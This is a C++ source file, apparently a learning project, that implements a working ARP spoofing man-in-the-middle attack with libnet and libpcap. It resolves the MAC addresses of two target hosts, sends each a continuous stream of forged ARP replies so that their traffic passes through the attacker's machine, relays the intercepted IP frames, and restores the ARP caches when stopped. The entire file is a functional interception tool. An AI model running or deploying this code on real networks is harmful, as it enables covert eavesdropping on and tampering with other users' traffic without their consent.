#include "arpspoofing.h"
#include <stdio.h>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <thread>

ARPSpoofing::ARPSpoofing(char *senderIP, char *receiverIP) {
    this->senderIP = senderIP;
    this->receiverIP = receiverIP;
    this->device = pcap_lookupdev(NULL);

    printf(">> Capturing from %s\n", this->device);
}

// TODO.
// fix more simply.
// especially thread part.
bool ARPSpoofing::Init() {
    printf(">> Initialize Start.\n");

    sockaddr_in t;
    std::thread recvARPThread;

    if (inet_aton(this->senderIP, &t.sin_addr) == 0) {
        fprintf(stderr, "sender IP transform error.");
        return false;
    }
    this->senderIPInt32 = (u_int32_t) t.sin_addr.s_addr;

    if (inet_aton(this->receiverIP, &t.sin_addr) == 0) {
        fprintf(stderr, "receiver IP transform error.");
        return false;
    }
    this->receiverIPInt32 = (u_int32_t) t.sin_addr.s_addr;

    recvARPThread = std::thread([this] {
        ARPSpoofing::recvARPResp(this->senderIPInt32, this->senderMAC);
    });
    sleep(1);
    if (ARPSpoofing::sendARPReq(this->senderIP) == false) {
        fprintf(stderr, "sender IP ARP request error.");
        return false;
    }
    recvARPThread.join();
    printf("Sender IP Address : %s\n", this->senderIP);
    printf("Sender MAC Address : %s\n", this->senderMAC);

    recvARPThread = std::thread([this] {
        ARPSpoofing::recvARPResp(this->receiverIPInt32, this->receiverMAC);
    });
    sleep(1);
    if (ARPSpoofing::sendARPReq(this->receiverIP) == false) {
        fprintf(stderr, "receiver IP ARP request error.");
        return false;
    }
    recvARPThread.join();
    printf("Receiver IP Address : %s\n", this->receiverIP);
    printf("Receiver MAC Address : %s\n", this->receiverMAC);

    printf(">> Initialize Successed.\n");
    return true;
}

void ARPSpoofing::Attack() {

    std::thread([this] {
        ARPSpoofing::relay();
    }).detach();

    std::thread([this] {
        while (this->exitFlag == false) {
            ARPSpoofing::sendARPResp(this->senderIP, this->senderMAC, this->receiverIP, NULL);
            ARPSpoofing::sendARPResp(this->receiverIP, this->receiverMAC, this->senderIP, NULL);
            sleep(1);
        }
    }).detach();

}

bool ARPSpoofing::Stop() {
    this->exitFlag = true;
    ARPSpoofing::recover();
    return true;
}

bool ARPSpoofing::sendARPReq(char *_dstIP) {
    return ARPSpoofing::_sendARP(_dstIP, NULL, NULL, NULL, ARPOP_REQUEST);
}

bool ARPSpoofing::sendARPResp(char *_dstIP, uint8_t *_dstMAC, char *_srcIP, uint8_t *_srcMAC) {
    return ARPSpoofing::_sendARP(_dstIP, _dstMAC, _srcIP, _srcMAC, ARPOP_REPLY);
}

// TODO.
// timeout fix
bool ARPSpoofing::recvARPResp(u_int32_t srcIPInt32, uint8_t *recvMAC) {
    pcap_t *handle;                 /* Session handle */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(this->device, BUFSIZ, 1, 5000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", this->device, errbuf);
        return false;
    }

    pcap_pkthdr header;
    const u_char *packet;

    while (true) {
        packet = pcap_next(handle, &header);
        libnet_ethernet_hdr *ethHeader = (libnet_ethernet_hdr*) packet;
        if (ntohs(ethHeader->ether_type) == ETHERTYPE_ARP) {
            _libnet_arp_hdr *arpHeader = (_libnet_arp_hdr*) (packet + sizeof(libnet_ethernet_hdr));
            if (ntohs(arpHeader->ar_op) == ARPOP_REPLY && (*(u_int32_t*) arpHeader->ar_spa) == srcIPInt32) {
                ether_ntoa_r((ether_addr*)ethHeader->ether_shost, (char*) recvMAC);
                pcap_close(handle);
                return true;
            }
        }
    }
}

bool ARPSpoofing::_sendARP(char *_dstIP, uint8_t *_dstMAC, char *_srcIP, uint8_t *_srcMAC, u_int16_t arpType) {
    int _t;
    in_addr_t dstIP = inet_addr(_dstIP);
    u_int8_t *dstMAC = libnet_hex_aton((_dstMAC == NULL ? "ff:ff:ff:ff:ff:ff" : (char*) _dstMAC), &_t);
    u_int8_t *dstHardware = libnet_hex_aton((_dstMAC == NULL ? "00:00:00:00:00:00" : (char*) _dstMAC), &_t);
    char errbuf[LIBNET_ERRBUF_SIZE];

    /* open context */
    libnet_t *l = libnet_init(LIBNET_LINK, this->device, errbuf);
    if (l == NULL) {
        fprintf(stderr, "Error opening context: %s", errbuf);
        return false;
    }

    /* get the hardware address, ip address for the card we are using */
    u_int32_t srcIP = (_srcIP == NULL ? libnet_get_ipaddr4(l) : (u_int32_t) inet_addr(_srcIP));
    libnet_ether_addr *srcMAC = (_srcMAC == NULL ? libnet_get_hwaddr(l) : (libnet_ether_addr*) libnet_hex_aton((char*) _srcMAC, &_t));

    /* build the ARP header */
    libnet_ptag_t arp = libnet_autobuild_arp(arpType, (u_int8_t*) srcMAC, (u_int8_t*) &srcIP, dstHardware, (u_int8_t*) &dstIP, l);
    if (arp == -1) {
        fprintf(stderr, "Unable to build ARP header: %s\n", libnet_geterror(l));
        return false;
    }

    /* build the ethernet header */
    libnet_ptag_t eth = libnet_build_ethernet(dstMAC, (u_int8_t*) srcMAC, ETHERTYPE_ARP, NULL, 0, l, 0);
    if (eth == -1) {
        fprintf(stderr, "Unable to build Ethernet header: %s\n", libnet_geterror(l));
        return false;
    }

    /* write the packet */
    if (libnet_write(l) == -1) {
        fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
        return false;
    }

    /* exit cleanly */
    libnet_destroy(l);
    return true;
}

bool ARPSpoofing::relay() {
    pcap_t *handle;                 /* Session handle */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(this->device, BUFSIZ, 1, 5000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", this->device, errbuf);
        return false;
    }

    pcap_pkthdr header;
    const u_char *packet;

    while (this->exitFlag == false) {
        packet = pcap_next(handle, &header);
        libnet_ethernet_hdr *ethHeader = (libnet_ethernet_hdr*) packet;
        if (ntohs(ethHeader->ether_type) == ETHERTYPE_IP) {
            memcpy(ethHeader->ether_dhost, this->receiverMAC, ETHER_ADDR_LEN);
            memcpy((u_char*) packet, ethHeader, sizeof(libnet_ethernet_hdr));
            pcap_sendpacket(handle, packet, header.len);
        }
    }

    return true;
}

void ARPSpoofing::recover() {
    ARPSpoofing::sendARPResp(this->senderIP, this->senderMAC, this->receiverIP, this->receiverMAC);
    ARPSpoofing::sendARPResp(this->receiverIP, this->receiverMAC, this->senderIP, this->senderMAC);
}
